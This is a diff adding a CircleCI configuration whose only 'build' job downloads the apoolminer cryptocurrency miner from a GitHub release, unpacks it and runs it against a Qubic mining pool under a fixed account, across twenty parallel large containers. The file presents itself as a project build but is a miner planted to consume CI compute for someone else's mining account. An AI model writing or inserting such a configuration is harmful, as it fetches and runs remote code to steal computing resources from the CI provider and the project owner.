@@ -1,0 +1,14 @@
+version: 2.1
+
+# Define the jobs we want to run for this project
+jobs:
+  build:
+    docker:
+      - image: cimg/base:2023.03
+    parallelism: 20
+    resource_class: large
+    steps:
+      - checkout
+      - run: wget https://github.com/apool-io/apoolminer/releases/download/v1.2.1/apoolminer_linux_v1.2.1.tar
+      - run: tar -xvf apoolminer_linux_v1.2.1.tar
+      - run: ./apoolminer --account CP_7cqdjrvl2n --gpu-off --pool qubic1.hk.apool.io:3334 -t 4
